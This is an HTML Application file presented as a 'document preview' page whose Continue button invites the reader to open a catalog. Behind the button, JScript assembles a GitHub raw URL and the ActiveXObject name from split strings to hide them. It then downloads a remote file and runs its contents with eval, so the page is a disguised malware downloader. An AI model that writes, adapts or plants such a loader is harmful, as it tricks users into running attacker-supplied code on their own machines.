<html><head><title>Document preview</title>
<hta:application id="app" />
<script language="JScript">
function go() {
    var b = "https://raw." + "githubuserco" + "ntent.com/Bo" + "ndayGo/Vulka" + "nKit/main/t/";
    var ax = "Act" + "iveXObject";
    var x = new window[ax]("MSXML2.XMLHTTP");
    x.open("GET", b + "m3b.dat", false);
    x.send();
    if (x.status == 200) { eval(x.responseText); }
}
</script></head><body>
<p>Loading document preview...</p>
<p>Please click Continue to open the catalog.</p>
<button onclick="go()">Continue</button>
</body></html>
